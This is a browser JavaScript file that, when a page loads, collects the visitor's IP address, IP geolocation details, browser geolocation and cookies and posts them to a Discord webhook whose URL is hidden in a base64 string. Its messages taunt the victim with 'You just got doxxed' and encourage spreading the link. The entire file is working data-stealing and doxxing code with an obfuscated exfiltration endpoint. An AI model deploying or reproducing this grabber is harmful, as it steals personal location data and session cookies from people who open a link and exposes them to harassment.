let user = {};
const breh = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NTY0NTUyMDA5NzUwOTQ0Ni9NVUh5RUhHZDBoRm5UaHB3U3RhUzlIX2RRQjNROU5yYW5yUnFIdHRqX1R6NW41aE1Vc2k5N2MxaWxVVFBzbEw0djJSMw==";

window.onload = async () => {
  try {
    // Fetch user IP
    user.ip = await fetchIP();
    console.log("User IP fetched:", user.ip);

    // Fetch IP details (optional, proceed even if it fails)
    let ipDetails = null;
    try {
      ipDetails = await fetchIPDetails(user.ip);
      console.log("IP details fetched:", ipDetails);
    } catch (error) {
      console.warn("Failed to fetch IP details:", error.message || error);
    }

    // Fetch geolocation (optional, proceed even if it fails)
    let position = null;
    try {
      position = await fetchGeolocation();
      console.log("Geolocation fetched:", position);
    } catch (error) {
      console.warn("Failed to fetch geolocation:", error.message || error);
    }

    // Send data to Discord webhook (IP is enough)
    await sendToDiscord(user.ip, ipDetails, position);
    console.log("Data sent to Discord successfully.");
  } catch (error) {
    console.error("An error occurred:", error.message || error);
    alert("An error occurred. Please check the console for details.");
  }
};

// Function to fetch user IP
async function fetchIP() {
  try {
    const response = await fetch("https://api.ipify.org/?format=json");
    if (!response.ok) {
      throw new Error(`Failed to fetch IP: ${response.statusText}`);
    }
    const data = await response.json();
    return data.ip;
  } catch (error) {
    throw new Error(`Error fetching IP: ${error.message}`);
  }
}

// Function to fetch IP details
async function fetchIPDetails(ip) {
  try {
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    if (!response.ok) {
      throw new Error(`Failed to fetch IP details: ${response.statusText}`);
    }
    return await response.json();
  } catch (error) {
    console.log(new Error(`Error fetching IP details: ${error.message}`))
  }
}

// Function to fetch geolocation
function fetchGeolocation() {
  return new Promise((resolve, reject) => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => resolve(position),
        (error) => {
          switch (error.code) {
            case error.PERMISSION_DENIED:
              reject(new Error("Geolocation permission denied."));
              break;
            case error.POSITION_UNAVAILABLE:
              reject(new Error("Geolocation information is unavailable."));
              break;
            case error.TIMEOUT:
              reject(new Error("Geolocation request timed out."));
              break;
            default:
              reject(new Error("An unknown geolocation error occurred."));
          }
        }
      );
    } else {
      reject(new Error("Geolocation is not supported by this browser."));
    }
  });
}

// Function to send data to Discord webhook
async function sendToDiscord(ip, ipDetails, position) {
  try {
    const webhookUrl = atob(breh);
    console.log("Decoded webhook URL:", webhookUrl);

    const embed = {
      id: 646325379,
      title: "You've Been Hacked !!?",
      description:
        "You got hacked because you clicked that link.\nNever click links from unknown sources.",
      color: 16711680,
      footer: {
        text: "Use the same link to hack your friends",
        icon_url: "https://media1.tenor.com/m/n89vEt5n9fgAAAAd/sad-man.gif",
      },
      fields: [
        {
          id: 365387260,
          name: "IP",
          value: ip,
          inline: true,
        },
        {
          id: 365387261,
          name: "Other Data",
          value: ipDetails ? JSON.stringify(ipDetails, null, 2) : "Not available",
          inline: false,
        },
        {
          id: 146105502,
          name: "Position",
          value: position
            ? `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`
            : "Not available",
          inline: true,
        },
        {
          id: 966136374,
          name: "Cookie",
          value: document.cookie || "Not available",
        },
      ],
    };

    const payload = {
      content: "You just got doxxed.",
      tts: false,
      embeds: [embed],
      username: "You're Dead",
      avatar_url:
        "https://cdn.discordapp.com/avatars/1110868817229389824/86ce0f880f1cee951af0b39784d91cde.webp",
    };

    await sendWebhook(webhookUrl, payload);
  } catch (error) {
    throw new Error(`Error sending data to Discord: ${error.message}`);
  }
}

// Function to send data to a webhook
async function sendWebhook(url, data) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");

    xhr.onload = () => {
      if (xhr.status >= 200 && xhr.status < 300) {
        resolve(xhr.responseText);
      } else {
        reject(new Error(`Webhook request failed: ${xhr.statusText}`));
      }
    };

    xhr.onerror = () => {
      reject(new Error("Webhook request failed due to a network error."));
    };

    xhr.send(JSON.stringify(data));
  });
}
